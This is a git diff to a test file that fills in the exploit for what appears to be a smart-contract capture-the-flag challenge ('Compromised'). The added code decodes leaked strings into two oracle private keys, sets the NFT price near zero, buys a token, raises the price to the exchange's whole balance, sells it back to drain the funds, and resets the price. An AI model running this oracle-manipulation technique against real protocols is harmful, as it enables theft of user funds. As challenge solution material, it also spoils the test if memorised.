@@ -61,6 +61,40 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        //Decode message 1
+        let serverResponse1 = "0x 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35".replaceAll(" ", "")
+        const decodedHexRes1 = ethers.utils.toUtf8String(serverResponse1)
+        const decodedBase64Res1 =  ethers.utils.base64.decode(decodedHexRes1)
+        const privateKey1 = ethers.utils.toUtf8String(decodedBase64Res1).split("0x")[1]
+        const wallet1 = new ethers.Wallet(privateKey1)
+        const connectedWallet1 = wallet1.connect(ethers.provider)
+        //Decode message 2
+        let serverResponse2 = "0x 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34".replaceAll(" ", "")
+        const decodedHexRes2 = ethers.utils.toUtf8String(serverResponse2)
+        const decodedBase64Res2 =  ethers.utils.base64.decode(decodedHexRes2)
+        const privateKey2 = ethers.utils.toUtf8String(decodedBase64Res2).split("0x")[1]
+        const wallet2 = new ethers.Wallet(privateKey2)
+        const connectedWallet2 = wallet2.connect(ethers.provider)
+        //Create instances of oracle and update nft prices
+        let oracleSource2Instance = await this.oracle.connect(connectedWallet1)
+        let oracleSource3Instance = await this.oracle.connect(connectedWallet2)
+        await oracleSource3Instance.postPrice("DVNFT", ethers.utils.parseEther('0.01'))
+        await oracleSource2Instance.postPrice("DVNFT", ethers.utils.parseEther('0.01'))
+        ////Buy nft
+        let exchangeAttackerInstance = await this.exchange.connect(attacker)
+        await exchangeAttackerInstance.buyOne({ value: ethers.utils.parseEther('0.01') })
+        //Boost the price of oracle to all the funds on the exchange
+        let balanceOnExchange = await ethers.provider.getBalance(this.exchange.address)
+        
+        await oracleSource2Instance.postPrice("DVNFT", balanceOnExchange)
+        await oracleSource3Instance.postPrice("DVNFT", balanceOnExchange)
+        //Sell nft, I know the Id is 0 as no other nft has been minted
+        let tokenAttackerInstance = await this.nftToken.connect(attacker)
+        await tokenAttackerInstance.approve(this.exchange.address, 0)
+        await exchangeAttackerInstance.sellOne(0)
+        //Set the price back to initial
+        await oracleSource2Instance.postPrice("DVNFT", INITIAL_NFT_PRICE)
+        await oracleSource3Instance.postPrice("DVNFT", INITIAL_NFT_PRICE)
     });
 
     after(async function () {
